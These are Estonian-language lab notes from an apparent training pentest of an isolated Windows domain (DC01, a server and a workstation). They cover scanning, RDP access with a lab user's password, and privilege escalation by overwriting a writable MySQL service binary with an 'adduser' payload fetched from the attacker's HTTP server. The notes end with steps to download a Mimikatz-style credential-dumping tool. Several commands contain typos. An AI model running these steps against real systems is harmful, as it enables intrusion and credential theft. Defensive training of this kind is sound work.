Kuldne Pilet

ltm hashist saab hiljem Kerberose võtme

*************************************************

PENTEST
VmWare keskkonnas kõik meie oma siseses VLANis
*************************************************

Masinad:
dc01 - peab kõike enne sisse lülitama
srv1
w11

*************************************************
Alustame Kali masinas

veendume oma IP, et oleme ikka samas võrgus nagu eelpool olevad seadmed, mille vastu hakkame rünnakut tegema
ip a

sudo nmap -sV -0 192.168.1.0.24

192.168.1.2
workgroup: CONTOSO
Domain: contoso.com
Host: DC01
MAC Address: 00:50:56:B8:2D:A1
port 

192.168.1.17
MAC Address: 00:50:56:B8:01:B7
port 3389 ehk rdp

saime teada DC01 masina nime ja tema ip, gruppi ja domeeni nime, ka MAC aadressid
sammuti ka serveri ip, kuid tema host nime ei saanud teada, kuid tal on lahti port 3389 ehk rdp
************************************************
W11 
k: Henry
p: V4hetaM1nd.

terminalis kontrollime:
whoami  (kes ma olen)
whoami /groups (kes ma olen ja mis grupid mul küljes on)
*************************************************
KALIS:

sudo xfreerdp3 /u:henry /p:'V4hetaM1nd.' /d:contoso /v:192.168.1.17
Y
ja avaneb uus aken ning logib Serverisse

avanenud serveris avame terminali ja kontrollime:

whoami /groups
hostname

remote desktopiga võib igaks juhuks kontrollida,kas tavakasutaja õigustega saab domeenikontrollerile ligi

Powershellis:
Get-CimInstance -ClassName Win32_service | Select Name,State,PathName,StartName | Where-Object State -like 'Running'

Nägime, et seal on MYSQL salvestame kogu tee koos selle exe faili nimega

sisestame 
icals 'C:\xampp\mysql\bin\mysqld.exe'

Näeme et Full access

Get-CimInstance -ClassName Win32_service -Filter "Name='mysql'" | Select-Object StartMode

Näeme, et Auto


*************************************************
Avame Kalis uue terminali

kontrollime kus oleme - ls

teeme uue kausta mkdir pentest ja siis siseneme temasse
cd pentest

loome uue faili nano adduser.c

siis teeme sellele ka .exe ja kõige lõpuks teeme sellest kaustast http veebiserveri
python3 -m http.server 80

siis lähme tagasi RDP powershell aknasse

iwr -Uri http:\\192.168.1.101\adduser.exe -OutFile adduser.exe

masinas saab sees kontrollida User kasutaja kaustas kas fail tekkis ja teises terminali on ka näha, et http server adduser.exe on ühendatud

PShell teeme algsest mysql failist backupi
move C:\\xampp\mysql\bin\mysqld.exe oldmysqld.exe

ja asendame ta


restart-computer ning liigume tagasi sinna aknasse, kus meil oli xfreerdp3 muudame seal kasutaja ja parooli nii nagu nano failis sisestasime ja eemaldame domeeni
sudo xfreerdp3 /u:pentest /p:'kalasaba1.' /v:192.168.1.17 
ja voilaa saamegi ADserverisse sisse oma kasutaja ja parooliga

Kali browseris:
https://github.com/leppalintu/invoke_mimikaz

laeme alla mõlemad, nii ps1 ja exe failid j tõstame nad oma pentest katalogi, mis on meie veebiserver



